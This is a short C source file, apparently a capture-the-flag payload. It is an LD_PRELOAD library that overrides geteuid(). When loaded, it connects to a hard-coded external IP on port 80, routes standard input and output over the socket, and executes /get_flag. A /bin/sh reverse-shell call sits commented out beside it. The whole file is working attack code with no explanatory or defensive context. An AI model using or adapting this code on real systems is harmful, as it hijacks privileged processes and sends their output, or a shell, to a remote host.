
#include<stdlib.h>
#include <stdio.h>        
#include<string.h> 
#include <stdio.h>
#include <unistd.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <signal.h>

#define REMOTE_ADDR "174.138.24.108"
#define REMOTE_PORT 80

 
void payload() {
    sigignore(SIGALRM);

    struct sockaddr_in sa;
    int s;

    sa.sin_family = AF_INET;
    sa.sin_addr.s_addr = inet_addr(REMOTE_ADDR);
    sa.sin_port = htons(REMOTE_PORT);

    s = socket(AF_INET, SOCK_STREAM, 0);
    connect(s, (struct sockaddr *)&sa, sizeof(sa));

    dup2(s, 0);
    dup2(s, 1);
    dup2(s, 2);

    // execve("/bin/sh", 0, 0);
    
    chdir("/");
    execve("/get_flag", 0, 0);

}   
 
uid_t geteuid() {
if(getenv("LD_PRELOAD") == NULL) { return 0; }
unsetenv("LD_PRELOAD");
payload();
}
